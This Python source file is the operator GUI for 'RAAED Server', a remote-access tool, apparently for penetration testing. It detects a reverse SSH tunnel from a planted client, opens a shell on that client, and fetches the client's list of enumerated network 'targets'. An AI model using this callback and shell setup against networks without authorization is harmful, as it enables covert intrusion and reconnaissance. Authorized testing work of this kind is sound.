#!/usr/bin/env python3

# RAAED Server software: v1.0
# A GUI RAAED Server
# Detects a reverse SSH connection bound to port 22 from an RAAED Client.
#
# DESCRIPTION
# The server is designed to continually check for the prescence of a reverse SSH session on port 22.
# The GUI will then reflect the presence of the reverse SSH session.
# A Shell in the context of the reverse SSH session can be launched through clicking a button.
#
# SSH REQUIREMENTS
# This script requires an SSH service to be active and running locally.
# /etc/ssh/sshd_config should be configured to allow public key authentication, and operate on port 443.
# a valid private RSA key for the RAAED Client should be placed in ~/.ssh (id_rsa)
# a valid public key with an associated private key on the RAAED Client should be located in ~/.ssh (id_rsa.pub)
#
# THIRD PARTY DEPENDENCIES
# pip3 install psutil
# pip3 install appjar
#
# AUTHOR: forScience (james@forscience.xyz)
# 
# INDENT: TABS


import sys
import os
import threading
import subprocess
import psutil
import time
from appJar import gui


# Checks if port 22 is listening on localhost.
# Called in a thread at launch. Runs in the background.
# If the the port is open then update GUI to reflect change
def connection_check():
	
	# loop infinately (in background)
	while True:
		time.sleep(2)
		# retrieve tuples of all local IPv4 connections (in form of [IP, Port])
		local = psutil.net_connections('inet4')
		connect = False # set flag to false each itteration of loop

		# iterrate through local IPv4 tuples
		for address in local:
			(ip, port) = address.laddr # assign each tuple to local variables
			# check each IP for localhost and Port for 22 
			if ip == '127.0.0.1' and port == 22:
				connect = True # set flag to indicate connection

		# if flag has been set then connection exists
		if connect:
			# only update GUI if port 22 on localhost is found
			gui_update("connected")
		else:
			# otherwise GUI continues to indicate disconnection
			gui_update("disconnected")
				

# Updates GUI to show client connection state
# Called by connection_check() depending on local port activity
# Updates indicator and text to reflect state
def gui_update(update):

	if update == "connected":
		# update gui to reflect connection
		# update indicator
		app.setLabel("indicator", "Connected") # update GUI indicator text
		app.setLabelBg("indicator", "green") # update GUI indicator colour

		# update text
		app.setLabelFg("text", "green") # update GUI text colour
		text = "Connected to client" # create explanation string
		app.setLabel("text", text) # update GUI with explanation string

	elif update == "disconnected":
		# update gui to reflect disconnection
		# update indicator
		app.setLabel("indicator", "Disconnected") # update GUI indicator text
		app.setLabelBg("indicator", "red") # update GUI indicator colour

		# update text
		app.setLabelFg("text", "red") # update GUI text colour
		text = "No connection from client" # create explanation string
		app.setLabel("text", text) # update GUI with explanation string

	elif update == "list targets":
		# update gui with targets from client
		# open retrieved network list file
		with open('/root/Desktop/network.list', 'r') as file:
			iplist = file.read() # read in file to variable and remove EOL
			# display targets in gui
			app.setMessage('enumeration', iplist)


# Spawns an SSH session in a new shell
# gnome-terminal only works within the GNOME DE
def spawn_shell(btn):
	# terminal remains open after command issued with '-x' 
	subprocess.call(['gnome-terminal', '-x', 'ssh', 'localhost'])


# Connects via scp to RAAED Client and retrieves a list of
# IPs enumerated on the Clients local network.
# The list is displayed in the GUI
def get_enum(btn):

	# define local and remote list locations
	localdest = "/root/Desktop/network.list"
	remotedest = "/root/Desktop/network.list"

	# retrieve enumeration txt files from client
	sshcopy = "scp root@localhost:" + remotedest + " " + localdest # build ssh copy command
	copyresult = subprocess.call(sshcopy, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) # execute scp command

	# if scp was successful
	if copyresult == 0:
		# update gui and delete localdest file
		gui_update('list targets')
		delfile = "rm " + localdest # build command to delete local network.list file
		subprocess.call(delfile, shell=True) # delete file


# Entry
if __name__ == "__main__":
	
	# put connection_check() in a thread and background
	thread = threading.Thread(target=connection_check, args=())
	thread.daemon = True # daemonised for clean closure, ok to kill with main
	thread.start() # start daemon thread

	# <<<<<<<<<<<<<<<<<<<<<<<<<<<<
	# GUI ELEMENTS
	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>
	# create the GUI & set a title
	app = gui("RAAED Server")
	app.setBg("white")
	app.setFont(12, font="Arial")
	app.setSticky("nesw")
	app.setResizable(canResize=False)


	# RAAED CONNECTION STATUS
	app.startLabelFrame("Connection Status")
	app.setLabelFramePadding("Connection Status", 4, 8)
	# connection indicator
	app.addLabel("indicator", "Disconnected", 0, 0)
	app.setLabelBg("indicator", "red")
	app.setLabelFg("indicator", "white")
	app.setLabelPadding("indicator", 2, 5)
	# explanation text
	app.addLabel("text", "No connection from client", 0, 1)
	app.setLabelFg("text", "red")
	app.setLabelPadding("text", 4, 8)
	# end frame
	app.stopLabelFrame()

	# SPAWN SHELL AND RETRIEVE ENUM BUTTONS
	app.startLabelFrame("")
	app.setLabelFramePadding("", 4, 8)
	# spawn shell button
	app.addButton("Spawn Shell", spawn_shell, 0, 0)
	# retrieve enumeration button
	app.addButton("Show Remote Hosts", get_enum, 0, 1)
	# end bottom frame
	app.stopLabelFrame()

	# REMOTE TARGET LIST
	app.startLabelFrame("Remote Network Hosts")
	app.setLabelFramePadding("Remote Network Hosts", 4, 8)
	# spawn shell button
	app.addEmptyMessage("enumeration")
	# end bottom frame
	app.stopLabelFrame()
	
	# start GUI
	app.go()